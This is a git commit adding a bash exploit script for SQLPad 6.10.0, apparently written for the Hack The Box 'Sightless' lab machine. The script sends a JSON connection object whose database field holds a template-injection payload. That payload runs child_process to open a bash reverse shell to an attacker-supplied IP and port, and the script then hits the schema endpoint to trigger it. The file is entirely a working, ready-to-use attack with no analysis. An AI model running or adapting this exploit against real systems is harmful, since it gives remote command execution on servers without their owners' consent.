94f615737d71ab394c6343f8d8a899fc06b838ed
worm-403 <gredercastellanos@icloud.com>
2024-09-08 11:38:40 -0400

    first commit

---
+++ SQLPad_ 6.10.0.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+#Recuerda poner el Netcat en e purto de escucha
+
+IP="${1}"
+PORT="${2}"
+
+if [[ -z "${@}" ]]; then
+    echo "Añade la IP y el Puerto"
+    echo "Ejemplo: ./exploit.sh IP PORT"
+    exit 1
+fi
+
+payload=$(cat <<EOF
+{
+  "name": "worm",
+  "driver": "mysql",
+  "data": {
+    "database": "{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\"') }}"
+  }
+}
+EOF
+)
+
+response=$(curl -s -X POST 'http://sqlpad.sightless.htb/api/connections' \
+-H 'Content-Type: application/json' \
+-d "$payload")
+
+id=$(echo "$response" | jq -r '.id')
+
+curl -s "http://sqlpad.sightless.htb/api/connections/${id}/schema" &>/dev/null 
